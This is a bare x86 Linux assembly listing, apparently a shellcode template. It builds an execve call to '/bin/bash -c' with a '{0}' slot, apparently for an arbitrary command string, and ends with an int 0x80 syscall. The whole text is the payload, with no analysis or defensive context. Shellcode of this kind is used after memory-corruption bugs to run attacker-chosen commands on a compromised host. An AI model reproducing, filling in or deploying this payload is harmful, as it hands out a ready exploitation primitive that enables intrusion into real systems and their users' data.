push   $0xb
pop    %eax
cltd
push   %edx
{0}
mov    %esp,%esi
push   %edx
push   $0x632d9090
pop    %ecx
shr    $0x10,%ecx
push   %ecx
mov    %esp,%ecx
push   %edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %esp,%ebx
push   %edx
push   %edi
push   %esi
push   %ecx
push   %ebx
mov    %esp,%ecx
int    $0x80